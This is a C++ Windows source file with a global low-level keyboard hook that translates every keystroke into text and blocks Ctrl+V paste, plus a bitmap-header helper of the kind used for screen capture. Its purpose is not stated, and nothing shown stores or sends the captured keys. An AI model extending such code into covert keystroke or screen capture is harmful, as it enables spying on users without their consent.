#include "hook.h"
#include "utils.h"

HHOOK hHook{ NULL };

enum Keys
{
	ShiftKey = 16,
	Capital = 20,
};


int shift_active() {
	return GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0;
}

int capital_active() {
	return (GetKeyState(VK_CAPITAL) & 1) == 1;
}


LRESULT CALLBACK keyboard_hook(const int code, const WPARAM wParam, const LPARAM lParam) {
	if (wParam == WM_KEYDOWN) {
		KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
		DWORD wVirtKey = kbdStruct->vkCode;
		DWORD wScanCode = kbdStruct->scanCode;

		BYTE lpKeyState[256];
		GetKeyboardState(lpKeyState);
		lpKeyState[Keys::ShiftKey] = 0;
		lpKeyState[Keys::Capital] = 0;
		if (shift_active()) {
			lpKeyState[Keys::ShiftKey] = 0x80;
		}
		if (capital_active()) {
			lpKeyState[Keys::Capital] = 0x01;
		}

		unsigned char result;
		char strKey[0x40] = { 0 };
		switch (wVirtKey)
		{
		case 8:
			strcpy_s(strKey, "[Backspace]");
			break;
		case 46:
			strcpy_s(strKey, "[Delete]");
			break;
		case 37:
			strcpy_s(strKey, "[Left]");
			break;
		case 38:
			strcpy_s(strKey, "[Top]");
			break;
		case 39:
			strcpy_s(strKey, "[Right]");
			break;
		case 40:
			strcpy_s(strKey, "[Bottom]");
			break;
		case 35:
			strcpy_s(strKey, "[End]");
			break;
		case 36:
			strcpy_s(strKey, "[Home]");
			break;
		default:
			ToAscii(wVirtKey, wScanCode, lpKeyState, (LPWORD)&result, 0);
			sprintf_s(strKey, "%c", result);
			break;
		}
		
		DWORD CTRL_key = GetAsyncKeyState(VK_CONTROL);
		DWORD Shift_key = GetAsyncKeyState(VK_SHIFT);
		
		// printf("%s(0x%X)\n", strKey, wVirtKey);
		if (CTRL_key != 0 && (wVirtKey == 'v' || wVirtKey == 'V')) {

			return -1;
		}
	}
	return CallNextHookEx(hHook, code, wParam, lParam);
}






BITMAPINFOHEADER createBitmapHeader(int width, int height)
{
	BITMAPINFOHEADER  bi;

	// create a bitmap
	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = width;
	bi.biHeight = -height;  //this is the line that makes it draw upside down or not
	bi.biPlanes = 1;
	bi.biBitCount = 32;
	bi.biCompression = BI_RGB;
	bi.biSizeImage = 0;
	bi.biXPelsPerMeter = 0;
	bi.biYPelsPerMeter = 0;
	bi.biClrUsed = 0;
	bi.biClrImportant = 0;

	return bi;
}
